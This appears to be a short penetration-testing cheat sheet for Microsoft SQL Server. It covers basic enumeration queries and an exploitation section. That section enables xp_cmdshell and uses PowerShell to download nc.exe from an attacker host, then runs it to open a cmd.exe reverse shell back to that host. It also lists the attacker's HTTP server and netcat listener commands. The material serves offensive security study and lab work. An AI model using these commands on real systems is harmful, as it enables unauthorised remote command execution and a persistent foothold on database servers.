#database 
## Info
- **Type:** Relational Database Management System (RDBMS)
- **Common Usage:** Enterprise applications, web applications, Windows-based infrastructure
- **Security Note:** MSSQL servers may be vulnerable to **default credentials, weak authentication, XP_CMDSHELL abuse, and privilege escalation attacks**.

## Basic Commands
```bash
# Connect using authentication
mssqlclient.py $USER@$IP -windows-auth

# List databases
SELECT name FROM master.dbo.sysdatabases;

# Select a database
USE $DATABASE;

# List tables in the current database
SELECT * FROM information_schema.tables;

# List all users
SELECT name FROM master.sys.syslogins;

# Get current user
SELECT SYSTEM_USER;

# Checking Permissions
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## Exploitation
```sql
enable_xp_cmdshell
xp_cmdshell "powershell -c pwd"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http:///$HOST/nc.exe -outfile nc.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe $HOST $PORT"
```

```bash
sudo python3 -m http.server 80
```

```bash
sudo nc -lnvp 443
```